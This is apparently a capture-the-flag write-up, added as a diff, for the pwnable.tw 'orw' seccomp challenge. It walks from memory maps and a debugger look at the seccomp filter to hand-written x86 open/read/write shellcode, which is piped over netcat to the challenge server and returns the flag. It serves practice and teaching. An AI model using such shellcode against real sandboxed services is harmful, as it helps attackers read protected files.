@@ -1,0 +1,258 @@
+================ ASLR check =================
+Running the bin twice we can see that ASLR is disabled in the text section, althouh I'm not sure why there's 3 of them ...
+
+~$ cat /proc/3483/maps
+08048000-08049000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+08049000-0804a000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+0804a000-0804b000 rwxp 00001000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+f7569000-f756a000 rwxp 00000000 00:00 0 
+f756a000-f771e000 r-xp 00000000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f771e000-f7721000 r-xp 001b3000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f7721000-f7723000 rwxp 001b6000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f7723000-f7725000 rwxp 00000000 00:00 0 
+f7743000-f7745000 rwxp 00000000 00:00 0 
+f7745000-f7747000 r--p 00000000 00:00 0                                  [vvar]
+f7747000-f7748000 r-xp 00000000 00:00 0                                  [vdso]
+f7748000-f776a000 r-xp 00000000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f776a000-f776b000 r-xp 00021000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f776b000-f776c000 rwxp 00022000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+ffbc7000-ffbe8000 rwxp 00000000 00:00 0                                  [stack]
+
+~$ cat /proc/3549/maps
+08048000-08049000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+08049000-0804a000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+0804a000-0804b000 rwxp 00001000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+f7535000-f7536000 rwxp 00000000 00:00 0 
+f7536000-f76ea000 r-xp 00000000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76ea000-f76ed000 r-xp 001b3000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76ed000-f76ef000 rwxp 001b6000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76ef000-f76f1000 rwxp 00000000 00:00 0 
+f770f000-f7711000 rwxp 00000000 00:00 0 
+f7711000-f7713000 r--p 00000000 00:00 0                                  [vvar]
+f7713000-f7714000 r-xp 00000000 00:00 0                                  [vdso]
+f7714000-f7736000 r-xp 00000000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f7736000-f7737000 r-xp 00021000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f7737000-f7738000 rwxp 00022000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+fffd7000-ffff8000 rwxp 00000000 00:00 0                                  [stack]
+
+============== Static RE: read =======================
+read call in main copies 200 bytes into 0x804a060 -> shellcode
+
+============== Static RE: prctl.h ====================
+2 calls in orw_seccomp
+1) prctl(0x26,0x1,0x0,0x0,0x0)
+	prctl(38,1,0,0,0)
+	#define PR_SET_NO_NEW_PRIVS	38
+
+	Set the calling thread's no_new_privs bit to the value in arg2.
+	With no_new_privs set to 1, execve(2) promises not to grant privileges to do anything that could not have been done without the execve(2) call 
+		for example, rendering the set-user-ID and set-group-ID mode bits, and file capabilities non-functional.  
+	Once set, this bit cannot be unset.  
+	The setting of this bit is inherited by children created by fork(2) and clone(2), and preserved across execve(2).
+
+	The value of a thread's no_new_privs bit can be viewed via the NoNewPrivs field in the /proc/[pid]/status file.
+
+2) prctl(0x16,0x2,*eax)
+	prctl(22,2,0x0c)
+	#define PR_SET_SECCOMP	22
+	#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
+
+	With arg2 set to SECCOMP_MODE_FILTER (since Linux 3.5), the system calls allowed are defined by a pointer to a Berkeley Packet Filter passed in arg3.  
+	This argument is a pointer to
+		struct sock_fprog; 
+	it can be designed to filter arbitrary system calls and system call arguments.  
+	This mode is available only if the kernel is configured with CONFIG_SECCOMP_FILTER enabled.
+
+	https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt:
+	Prior to use, the task must call prctl(PR_SET_NO_NEW_PRIVS, 1) or
+	run with CAP_SYS_ADMIN privileges in its namespace.  If these are not
+	true, -EACCES will be returned.  This requirement ensures that filter
+	programs cannot be applied to child processes with greater privileges
+	than the task that installed them.
+
+============== with strace =================
+~$ strace ./orw 
+[... Redacted ...]
+prctl(PR_SET_NO_NEW_PRIVS, 0x1, 0, 0, 0) = 0
+prctl(PR_SET_SECCOMP, 0x2, 0xff8c59f4, 0xf76d9b90, 0x1) = 0
+[... Redacted ...]
+
+~$ cat /proc/4671/maps
+08048000-08049000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+08049000-0804a000 r-xp 00000000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+0804a000-0804b000 rwxp 00001000 fc:01 131121                             /home/ctf/pwnable/ORW/orw
+f74fe000-f74ff000 rwxp 00000000 00:00 0 
+f74ff000-f76b3000 r-xp 00000000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76b3000-f76b6000 r-xp 001b3000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76b6000-f76b8000 rwxp 001b6000 fc:01 8262479                            /lib/i386-linux-gnu/libc-2.21.so
+f76b8000-f76ba000 rwxp 00000000 00:00 0 
+--> arg4 --> f76d8000-f76da000 rwxp 00000000 00:00 0 
+f76da000-f76dc000 r--p 00000000 00:00 0                                  [vvar]
+f76dc000-f76dd000 r-xp 00000000 00:00 0                                  [vdso]
+f76dd000-f76ff000 r-xp 00000000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f76ff000-f7700000 r-xp 00021000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+f7700000-f7701000 rwxp 00022000 fc:01 8262448                            /lib/i386-linux-gnu/ld-2.21.so
+--> arg3 --> ff8a7000-ff8c8000 rwxp 00000000 00:00 0                     [stack]
+
+So the pointers (I thought there was only 1?!?) to sock_fprog point to the stack, and where?
+=========== Checking out that bpf ================
+pwndbg> disas orw_seccomp
+Dump of assembler code for function orw_seccomp:
+[... redacted ...]
+   0x08048515 <+74>:	add    esp,0x20
+   0x08048518 <+77>:	sub    esp,0x4
+   0x0804851b <+80>:	lea    eax,[ebp-0x84]
+   0x08048521 <+86>:	push   eax
+   0x08048522 <+87>:	push   0x2
+   0x08048524 <+89>:	push   0x16
+   0x08048526 <+91>:	call   0x80483b0 <prctl@plt>
+[... redacted ...]
+End of assembler dump.
+pwndbg> b *0x08048521
+Breakpoint 1 at 0x8048521
+pwndbg> r
+pwndbg> x/2dwx $eax
+0xffffcf74:	0x0000000c	0xffffcf7c
+
+Documentation says that the struct pointed to by arg3, stored in %eax, contains length (0xc) and pointer to filter (0xffffcf7c)
+
+pwndbg> x/12qwx 0xffffcf7c
+0xffffcf7c:	0x00000020	0x00000004	0x09000015	0x40000003
+0xffffcf8c:	0x00000020	0x00000000	0x00070015	0x000000ad
+0xffffcf9c:	0x00060015	0x00000077	0x00050015	0x000000fc
+
+That's our filter!
+
+============= Using instructions ===============
+Instead of RE the bpf, we can just go off of what the instructions for this problem say:
+ORW => open, read, write syscalls only
+So we need to open /home/orw/flag, then read it, then write it to stdout
+The interesting bit here is that we don't get a .data_section in our .asm exploit. Instead we have to use the stack as a scratch pad.
+First we push the string "/home/orw/flag" to the stack and use it as the input arg for the sys_open call.
+Then we sys_read the file onto the stack.
+Then we sys_write the first arbitrary number ouf bytes of stack to stdout, I chose 100.
+
+======== building the sploit =====================
+[BITS 32]
+section .text
+global _start        	;export the default _start symbol
+_start:    mov eax,5    ;sys_open
+    push 0x00006761
+    push 0x6c662f77
+    push 0x726f2f65
+    push 0x6d6f682f
+;2f68 6f6d 652f 6f72 772f 666c 6167 0a    /home/orw/flag.
+    mov ebx,esp		;use null terminated string on stack as input
+    mov ecx, 2		;read-write permissions
+    int 0x80
+    mov ebx,eax    	;save FD for sys_read
+    mov eax,3    	;sys_read
+    mov ecx,esp    	;write to stack
+    mov edx,0x64    	;read 100 bytes
+    int 0x80
+    mov eax, 4    	;sys_write
+    mov ebx, 1    	;stdout
+    mov ecx, esp    	;pointer to output buffer
+    mov edx, 0x64    	;size of output buffer
+    int 0x80
+    mov eax,1    	;sys_exit
+    mov ebx,0    	;return code
+    int 0x80
+
+Then we run it like so:
+~$ nasm -f bin subtle.asm -o /dev/stdout | nc chall.pwnable.tw 10001
+Give my your shellcode:/home/orw/flag���v�����7�\�v�v�7�\�$���,���v�<y�0y�v�v�
+
+We use this instead of the three step delivery: 
+~$ nasm -f bin subtle.asm -o subtle.o
+~$ ld -m elf_32 -s -o subtle subtl.o
+~$ nc chall.pwnable.tw 10001 < subtle 
+
+Looks like we aren't getting any output from /home/orw/flag...
+Given that we write the stack to stdout, we know that sys_write works. This mean that sys_read or sys_open fail.
+Let's try to troubleshoot this, starting with sys_open. To do this we have to look at the return value stored in %eax after the function call.
+Luckily our sys_write works so we can push %eax to the stack and see what it tells us.
+We change our sploit as follows:
+
+[BITS 32]
+section .text
+global _start           
+_start:    mov eax,5    
+    push 0x00006761
+    push 0x6c662f77
+    push 0x726f2f65
+    push 0x6d6f682f
+    mov ebx,esp         
+    mov ecx, 2          
+    int 0x80
+    push eax		;NEW LINE	
+    mov ebx,eax         
+    mov eax,3           
+    mov ecx,esp         
+    mov edx,0x64        
+    int 0x80
+    mov eax, 4          
+    mov ebx, 1          
+    mov ecx, esp        
+    mov edx, 0x64       
+    int 0x80
+    mov eax,1           
+    mov ebx,0           
+    int 0x80
+
+
+
+~$ nasm -f bin subtle.asm -o /dev/stdout | nc chall.pwnable.tw 10001 | xxd
+00000000: 4769 7665 206d 7920 796f 7572 2073 6865  Give my your she
+00000010: 6c6c 636f 6465 3ae2 ffff ff2f 686f 6d65  llcode:..../home
+00000020: 2f6f 7277 2f66 6c61 6700 008c 8504 08dc  /orw/flag.......
+00000030: 3375 f760 95a3 ff00 0000 0037 b65b f700  3u.`.......7.[..
+00000040: 3075 f700 3075 f700 0000 0037 b65b f701  0u..0u.....7.[..
+00000050: 0000 00f4 95a3 fffc 95a3 ff00 0000 0000  ................
+00000060: 0000 0000 0000 0000 3075 f704 5c78 f700  ........0u..\x..
+00000070: 5078 f700 0000 0000 3075 f7              Px......0u.
+
+Comparing with the previous output we see that an additional 4 bytes are written before /home:
+"e2 ffff ff" which translates to 0xffffffe2.
+Convert this to a signed int and get -30
+Some googling reveals that it's the return code for "Read only file system"
+So we messed up our file permissions flag, let's change it to read-only:
+
+[BITS 32]
+section .text
+global _start
+_start:    mov eax,5    
+    push 0x00006761 
+    push 0x6c662f77 
+    push 0x726f2f65 
+    push 0x6d6f682f 
+    mov ebx,esp
+    mov ecx, 0		;changed from 2 to 0
+    int 0x80
+    ;push eax           ;NEW LINE
+    mov ebx,eax         
+    mov eax,3           
+    mov ecx,esp         
+    mov edx,0x64        
+    int 0x80
+    mov eax, 4          
+    mov ebx, 1          
+    mov ecx, esp        
+    mov edx, 0x64       
+    int 0x80
+    mov eax,1           
+    mov ebx,0           
+    int 0x80
+
+~$ nasm -f bin subtle.asm -o /dev/stdout | nc chall.pwnable.tw 10001
+
+00000000: 4769 7665 206d 7920 796f 7572 2073 6865  Give my your she
+00000010: 6c6c 636f 6465 3a46 4c41 477b 7368 336c  llcode:FLAG{sh3l
+00000020: 6c63 3064 696e 675f 7731 7468 5f6f 7033  lc0ding_w1th_op3
+00000030: 6e5f 7233 3464 5f77 7269 7433 7d0a f700  n_r34d_writ3}...
+00000040: 6079 f700 0000 0037 e65f f701 0000 00b4  `y.....7._......
+00000050: 9f80 ffbc 9f80 ff00 0000 0000 0000 0000  ................
+00000060: 0000 0000 6079 f704 8c7c f700 807c f700  ....`y...|...|..
+00000070: 0000 0000 6079 f700 6079 f7              ....`y..`y.
+
+EEEHHHHH!!!!!!!! got the flag!!
